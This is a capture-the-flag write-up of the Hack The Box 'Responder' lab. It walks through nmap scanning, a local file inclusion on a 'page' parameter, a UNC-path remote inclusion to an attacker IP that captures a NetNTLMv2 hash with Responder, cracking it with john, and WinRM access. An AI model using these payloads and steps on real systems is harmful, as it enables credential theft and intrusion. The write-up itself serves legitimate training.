---
title: HTB Responder
date: 2022-08-04 01:55:00 +0800
categories: [HTB, Starting Point]
tags: [SAMBA, Apache, WinRM, Enumeration]
pin: false
---

![responder-htb](https://www.hackthebox.com/storage/avatars/0348ed41851064f497d155c2a6af359a.png)

In this machine we will experiment with SMB relay attacks using a remote file inclusion in a website and connecting through Windows remote management system.

## Scanning and enumeration

Now it's time to start the active scanning.

As always, we define our TARGET and hosts file of our machine to facilitate the process.

```console
TARGET=10.129.5.42
echo "10.129.5.42 responder.htb" | sudo tee -a /etc/hosts
```

We launch a single `TCMP` probe to check ping.

```console
ping -c 1 $TARGET		# => Ping is working
```

We can see that it's a Windows system.

```console
PING 10.129.5.42 (10.129.5.42) 56(84) bytes of data.
64 bytes from 10.129.5.42: icmp_seq=1 ttl=127 time=55.0 ms

--- 10.129.5.42 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 54.962/54.962/54.962/0.000 ms
```

### NMAP

To scan the `target` to find open ports and possible vulnerabilities we use `nmap`.

First, simple `TCP` scan without `DNS` resolution and ping discovery, to all the ports and with the version detection. (I applied here `--min-rate` as the scan was very slow and we don't care about HTB machines...)

```console
nmap -n -Pn -sV -p- --min-rate 5000 $TARGET -vvv -oG allPorts
```

We can see that it has the following ports open:

```console
PORT     STATE SERVICE    REASON  VERSION
80/tcp   open  http       syn-ack Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http       syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  pando-pub? syn-ack
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We also start a UDP check.

```console
sudo nmap -n -Pn -sVC -sU -p- --min-rate 5000 $TARGET -vvv -oG allPortsUDP
```

Nothing here of interest.

We pass the scripts.

```console
nmap -n -Pn -sVC -oN targeted -vvv -p80,5985,7680 $TARGET
```


### Website in 80

```console
whatweb http://responder.htb
http://responder.htb [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.129.5.42], Meta-Refresh-Redirect[http://unika.htb/], OpenSSL[1.1.1m], PHP[8.1.1], X-Powered-By[PHP/8.1.1]
ERROR Opening: http://unika.htb/ - no address for unika.htb

```

We see that it is redirecting to _<http://unika.htb>_ which we might need to also include in the hosts file after inspecting.

```console
echo "10.129.5.42 unika.htb" | sudo tee -a /etc/hosts
```

![unika-htb](/assets/img/posts/unika-htb.png)

We can inspect the source code of the site.

By inspecting the site we can see that we have a language selector that is loading the language file using a `page` parameter.

We can try to see if we are capable of launching a `LFI`.

_<http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts>_

It works. If we see an error message from php include, it can also provide information that the server is vulnerable to file inclusion. In this case we are using a local file inclusion, the idea is to link a remote file inclusion with a Samba relay attack.

We will start `Responder.py` that in kali is located in `/usr/share/responder`. The interface used is the `VPN` tunnel from `HTB`. 

```console
sudo Responder.py -I tun0
```

Then, we will call in the browser the remote file inclusion asking for a file in our server.

_<http://unika.htb/index.php?page=//10.10.14.221/hello>_

We will see in the responder that we intercepted the NTLM hash from the user. We just need to crack it with `john` and see if the user is using a common password.

```console
john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash.txt
```

Please note that we put `-w*=*/usr/share`, it's very important to include the `=`. Sometimes we are use to put just the flag and we see strange errors from `john` about the `UTF-8`.

## Gaining access

Now that we have the password we are able to start a session in the PC. You can use `evil-winrm` and see the flag.